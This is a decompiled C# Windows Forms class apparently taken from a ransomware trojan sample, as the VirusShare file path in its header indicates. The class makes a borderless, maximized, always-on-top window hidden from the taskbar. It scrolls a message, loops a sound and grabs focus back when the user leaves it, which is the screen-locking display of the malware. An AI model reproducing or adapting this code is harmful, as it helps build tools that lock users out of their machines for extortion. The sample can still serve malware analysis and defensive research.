// Decompiled with JetBrains decompiler
// Type: setup.fEnd
// Assembly: setup, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 6FA179CD-C6DD-49E1-8167-579BB94FEB58
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00060-msil\Trojan-Ransom.Win32.Agent.le-c87aca3d3f3f7d91c25f958bdf91631280e8c43d.exe

using setup.Properties;
using System;
using System.ComponentModel;
using System.Drawing;
using System.Media;
using System.Reflection;
using System.Threading;
using System.Windows.Forms;

namespace setup
{
  public class fEnd : Form
  {
    private IContainer components;
    private Label lblTxt;
    private int sh = Screen.PrimaryScreen.Bounds.Height;
    private int sw = Screen.PrimaryScreen.Bounds.Width;
    private Thread thread;
    private SoundPlayer player;

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (fEnd));
      this.lblTxt = new Label();
      this.SuspendLayout();
      this.lblTxt.AutoSize = true;
      this.lblTxt.Location = new Point(79, 98);
      this.lblTxt.Name = "lblTxt";
      this.lblTxt.Size = new Size(0, 12);
      this.lblTxt.TabIndex = 0;
      this.AutoScaleDimensions = new SizeF(6f, 12f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.BackColor = Color.Black;
      this.ClientSize = new Size(284, 262);
      this.Controls.Add((Control) this.lblTxt);
      this.FormBorderStyle = FormBorderStyle.None;
      this.Icon = (Icon) componentResourceManager.GetObject("$this.Icon");
      this.Name = nameof (fEnd);
      this.ShowIcon = false;
      this.ShowInTaskbar = false;
      this.Text = nameof (fEnd);
      this.TopMost = true;
      this.Leave += new EventHandler(this.fEnd_Leave);
      this.ResumeLayout(false);
      this.PerformLayout();
    }

    protected override CreateParams CreateParams
    {
      get
      {
        CreateParams createParams = base.CreateParams;
        createParams.ClassStyle |= 512;
        return createParams;
      }
    }

    public fEnd()
    {
      this.InitializeComponent();
      this.FormBorderStyle = FormBorderStyle.None;
      this.WindowState = FormWindowState.Maximized;
      this.Text = Settings.Default.fn;
      this.lblTxt.Text = lib.GetEnd();
      if (this.lblTxt.Width < this.sw)
        this.lblTxt.Location = new Point(this.sw / 2 - this.lblTxt.Width / 2, this.sh);
      else
        this.lblTxt.Location = new Point(20, this.sh);
      this.lblTxt.BackColor = Color.Transparent;
      this.lblTxt.Parent = (Control) this;
      this.lblTxt.ForeColor = Color.White;
      this.thread = new Thread(new ThreadStart(this.MoveText));
      this.thread.IsBackground = true;
      this.thread.Start();
    }

    private void SetProgressValue(int num)
    {
      if (this.lblTxt.Bottom < 0)
        this.lblTxt.Top = this.sh;
      else
        this.lblTxt.Top -= num;
      this.lblTxt.Update();
    }

    private void MoveText()
    {
      fEnd.SetProgressValueDelegate method = new fEnd.SetProgressValueDelegate(this.SetProgressValue);
      Assembly executingAssembly = Assembly.GetExecutingAssembly();
      try
      {
        this.player = new SoundPlayer(executingAssembly.GetManifestResourceStream("setup.goose.wav"));
        this.player.PlayLooping();
        while (true)
        {
          this.Invoke((Delegate) method, (object) 1);
          Thread.Sleep(10);
        }
      }
      catch (Exception ex)
      {
      }
    }

    private void fEnd_Leave(object sender, EventArgs e) => this.Focus();

    private delegate void SetProgressValueDelegate(int num);
  }
}
